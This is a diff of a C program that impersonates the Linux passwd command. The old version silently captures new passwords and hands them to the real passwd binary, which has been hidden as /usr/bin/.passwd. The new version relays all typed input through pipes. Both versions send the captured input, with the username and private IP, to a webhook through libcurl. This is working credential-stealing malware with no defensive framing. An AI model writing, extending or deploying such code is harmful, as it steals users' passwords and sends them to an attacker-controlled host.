@@ -1,32 +1,125 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <unistd.h>
-#include <errno.h>
-#include <libgen.h>
-#include <curl/curl.h>
+#include <sys/types.h>
+#include <sys/select.h>
+#include <string.h>
+#include <fcntl.h>
 #include <termios.h>
+#include <errno.h>
 #include <sys/wait.h>
-#include <pwd.h> // For getpwnam()
-#include <pty.h> // For forkpty
+#include <curl/curl.h>
+#include <ifaddrs.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
 #define WEBHOOK_URL "YOUR_WEBHOOK_URL"
 
-void send_webhook(const char *username, const char *operation, const char *password) {
+// Function to escape special characters in a string for JSON formatting
+void escape_json_string(char *dest, const char *src) {
+    while (*src) {
+        switch (*src) {
+            case '"':  // Escape double quote
+                *dest++ = '\\';
+                *dest++ = '"';
+                break;
+            case '\\':  // Escape backslash
+                *dest++ = '\\';
+                *dest++ = '\\';
+                break;
+            case '\n':  // Escape newline
+                *dest++ = '\\';
+                *dest++ = 'n';
+                break;
+            case '\r':  // Escape carriage return
+                *dest++ = '\\';
+                *dest++ = 'r';
+                break;
+            case '\t':  // Escape tab
+                *dest++ = '\\';
+                *dest++ = 't';
+                break;
+            default:    // Copy normal characters
+                *dest++ = *src;
+                break;
+        }
+        src++;
+    }
+    *dest = '\0';  // Null-terminate the string
+}
+
+// Function to strip trailing newlines from a string
+void strip_trailing_newline(char *str) {
+    size_t len = strlen(str);
+    if (len > 0 && str[len - 1] == '\n') {
+        str[len - 1] = '\0';  // Remove trailing newline
+    }
+}
+
+// Function to send the payload to the webhook
+void send_webhook(const char *operation, const char *input, char *args[]) {
     CURL *curl;
     CURLcode res;
 
+    // Get the system's username (from environment variable)
+    const char *username = getenv("USER");
     if (username == NULL || strlen(username) == 0) {
         username = "unknown_user";
     }
-    if (operation == NULL || strlen(operation) == 0) {
-        operation = "unknown_operation";
+
+    // Get the system's private IP address
+    char private_ip[INET_ADDRSTRLEN] = "unknown_ip";
+    struct ifaddrs *ifaddr, *ifa;
+    if (getifaddrs(&ifaddr) == 0) {
+        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+            if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
+                struct sockaddr_in *sa = (struct sockaddr_in *) ifa->ifa_addr;
+                // Skip loopback interface (127.0.0.1)
+                if (strcmp(ifa->ifa_name, "lo") != 0) {
+                    inet_ntop(AF_INET, &(sa->sin_addr), private_ip, INET_ADDRSTRLEN);
+                    break;
+                }
+            }
+        }
+        freeifaddrs(ifaddr);
     }
 
-    char payload[1024];
-    snprintf(payload, sizeof(payload), "{\"content\": \"User: %s, Operation: %s, Password: %s\"}", 
-             username, operation, password ? password : "null");
+    // Create the args string (escaped for JSON)
+    char args_str[1024] = "";
+    if (args != NULL) {
+        for (int i = 0; args[i] != NULL; i++) {
+            if (i > 0) strcat(args_str, " ");
+            escape_json_string(args_str + strlen(args_str), args[i]);
+        }
+    }
 
+    // Strip trailing newline from the input
+    char input_copy[1024];
+    snprintf(input_copy, sizeof(input_copy), "%s", input ? input : "null");
+    strip_trailing_newline(input_copy);
+
+    // Escape the input string
+    char escaped_input[1024];
+    escape_json_string(escaped_input, input_copy);
+
+    // Estimate the buffer size needed for the payload
+    int required_size = snprintf(NULL, 0,
+         "{\"content\": \"Username: %s, Private IP: %s, Operation: %s, Args: [%s], Input: %s\"}",
+        username, private_ip, operation, args_str, escaped_input) + 1;  // +1 for null terminator
+
+    // Allocate memory for the payload
+    char *payload = (char *)malloc(required_size);
+    if (payload == NULL) {
+        perror("malloc failed");
+        return;
+    }
+
+    // Now create the payload string
+    snprintf(payload, required_size,
+             "{\"content\": \"Username: %s, Private IP: %s, Operation: %s, Args: [%s], Input: %s\"}",
+             username, private_ip, operation, args_str, escaped_input);
+
+    // Initialize curl and send the data to the webhook
     curl = curl_easy_init();
     if (curl) {
         curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL);
@@ -40,140 +133,113 @@ void send_webhook(const char *username, const char *operation, const char *passw
         curl_slist_free_all(headers);
         curl_easy_cleanup(curl);
     }
+
+    // Free the dynamically allocated memory
+    free(payload);
 }
 
-int user_exists(const char *username) {
-    struct passwd *pw = getpwnam(username);
-    return (pw != NULL);
-}
+// Function to handle user input/output between parent and child process
+void handle_input_output(int pipe_in, int pipe_out) {
+    fd_set read_fds;
+    fd_set write_fds;
+    int max_fd = (pipe_in > pipe_out) ? pipe_in : pipe_out;
+    char buffer[1024];
+    ssize_t bytes_read;
 
-void capture_password(char *password, size_t size, const char *prompt) {
-    struct termios oldt, newt;
+    while (1) {
+        FD_ZERO(&read_fds);
+        FD_ZERO(&write_fds);
+        FD_SET(STDIN_FILENO, &read_fds);  // Monitor stdin for input
+        FD_SET(pipe_out, &read_fds);      // Monitor stdout of the child process
 
-    tcgetattr(STDIN_FILENO, &oldt);
-    newt = oldt;
-    newt.c_lflag &= ~(ECHO);
-    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
+        // Wait for any readable file descriptors
+        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
+            perror("select");
+            break;
+        }
 
-    printf("%s", prompt);
-    fflush(stdout);
-    if (fgets(password, size, stdin) == NULL) {
-        perror("Error reading password");
-        password[0] = '\0';
+        // Check if there's user input available
+        if (FD_ISSET(STDIN_FILENO, &read_fds)) {
+            // Read input from stdin
+            bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer) - 1);
+            if (bytes_read > 0) {
+                buffer[bytes_read] = '\0';  // Null-terminate the string
+                // Send the input to the webhook instead of printing
+                send_webhook("User input received", buffer, NULL);
+                write(pipe_in, buffer, bytes_read);  // Send input to the command
+            }
+        }
+
+        // Check if there's output from the child process
+        if (FD_ISSET(pipe_out, &read_fds)) {
+            // Read output from the child process
+            bytes_read = read(pipe_out, buffer, sizeof(buffer) - 1);
+            if (bytes_read > 0) {
+                buffer[bytes_read] = '\0';  // Null-terminate the output
+                printf("%s", buffer);       // Print the output of the command
+                fflush(stdout);  // Ensure the output is flushed immediately
+            }
+            // If the child process finished and there is no more output, exit the loop
+            if (bytes_read == 0) {
+                break;
+            }
+        }
     }
-
-    size_t len = strlen(password);
-    if (len > 0 && password[len - 1] == '\n') {
-        password[len - 1] = '\0';
-    }
-
-    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
-    printf("\n");
 }
 
 int main(int argc, char *argv[]) {
-    char *real_passwd_path = "/usr/bin/.passwd";
-    char *operation = "change_password";
-    char *username = NULL;
-    char password[256] = {0};
-    int intercept_password = 1;
+    int pipe_in[2], pipe_out[2];
 
-    if (argc > 1) {
-        for (int i = 1; i < argc; i++) {
-            if (argv[i][0] != '-') {
-                username = argv[i];
-            } else if (strcmp(argv[i], "-l") == 0) {
-                operation = "lock";
-                intercept_password = 0;
-            } else if (strcmp(argv[i], "-u") == 0) {
-                operation = "unlock";
-                intercept_password = 0;
-            } else if (strcmp(argv[i], "-d") == 0) {
-                operation = "delete";
-                intercept_password = 0;
-            } else if (strcmp(argv[i], "-e") == 0) {
-                operation = "expire";
-                intercept_password = 0;
-            }
-        }
+    // Create pipes for communication
+    if (pipe(pipe_in) == -1 || pipe(pipe_out) == -1) {
+        perror("pipe");
+        return EXIT_FAILURE;
     }
 
-    if (argc == 1) {
-        operation = "change_password";
-        intercept_password = 1;
+    pid_t pid = fork();
+    if (pid < 0) {
+        perror("fork");
+        return EXIT_FAILURE;
     }
 
-    if (!username) {
-        username = getlogin();
-        if (!username) {
-            perror("getlogin");
+    if (pid == 0) {  // Child process
+        // Close unused ends of the pipes
+        close(pipe_in[1]);
+        close(pipe_out[0]);
+
+        // Redirect stdin and stdout to pipes
+        if (dup2(pipe_in[0], STDIN_FILENO) == -1) {
+            perror("dup2 stdin");
             exit(EXIT_FAILURE);
         }
-    }
+        if (dup2(pipe_out[1], STDOUT_FILENO) == -1) {
+            perror("dup2 stdout");
+            exit(EXIT_FAILURE);
+        }
 
-    if (!user_exists(username)) {
-        fprintf(stderr, "passwd: user '%s' does not exist\n", username);
+        // Ensure the terminal is in the right mode for interactive use (e.g., canonical mode)
+        struct termios term;
+        tcgetattr(STDIN_FILENO, &term);  // Get the current terminal settings
+        term.c_lflag |= (ICANON | ECHO);  // Enable canonical input and echo
+        tcsetattr(STDIN_FILENO, TCSANOW, &term);  // Set the new terminal settings
+
+        // Execute the passwd command
+        execvp("passwd", argv);
+
+        // If execvp fails
+        perror("execvp");
         exit(EXIT_FAILURE);
+    } else {  // Parent process
+        // Close unused ends of the pipes
+        close(pipe_in[0]);
+        close(pipe_out[1]);
+
+        // Handle input and output
+        handle_input_output(pipe_in[1], pipe_out[0]);
+
+        // Wait for the child process to exit
+        waitpid(pid, NULL, 0);
     }
 
-    if (intercept_password) {
-        capture_password(password, sizeof(password), "New password: ");
-        char confirm_password[256] = {0};
-        capture_password(confirm_password, sizeof(confirm_password), "Retype new password: ");
-
-        if (strcmp(password, confirm_password) != 0) {
-            fprintf(stderr, "Sorry, passwords do not match.\n");
-            fprintf(stderr, "passwd: Authentication token manipulation error\n");
-            fprintf(stderr, "passwd: password unchanged\n");
-            exit(EXIT_FAILURE);
-        }
-    }
-
-    send_webhook(username, operation, intercept_password ? password : NULL);
-
-    if (strcmp(operation, "change_password") != 0) {     
-        pid_t pid = fork();
-        if (pid == 0) {
-            execv(real_passwd_path, argv);
-            perror("execv");
-            exit(EXIT_FAILURE);
-        } else if (pid > 0) {
-            int status;
-            waitpid(pid, &status, 0);
-        } else {
-            perror("fork");
-            exit(EXIT_FAILURE);
-        }
-    } else {
-        pid_t pid;
-        int master_fd;
-        if ((pid = forkpty(&master_fd, NULL, NULL, NULL)) == 0) {
-            if (strcmp(operation, "change_password") == 0) {
-                freopen("/dev/null", "w", stdout);
-                freopen("/dev/null", "w", stderr);
-            }
-            execv(real_passwd_path, argv);
-            perror("execv");
-            exit(EXIT_FAILURE);
-        } else if (pid > 0) {
-            // Parent process: send the password to the child process
-            if (intercept_password) {
-                dprintf(master_fd, "%s\n%s\n", password, password);
-            }
-    
-            int status;
-            waitpid(pid, &status, 0);
-            if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
-                char error_text[256];
-                strerror_r(WEXITSTATUS(status), error_text, sizeof(error_text));
-                printf("%s\n", error_text);
-            }
-            close(master_fd);
-        } else {
-            perror("fork");
-            exit(EXIT_FAILURE);
-        }
-    }
-
-    return 0;
+    return EXIT_SUCCESS;
 }
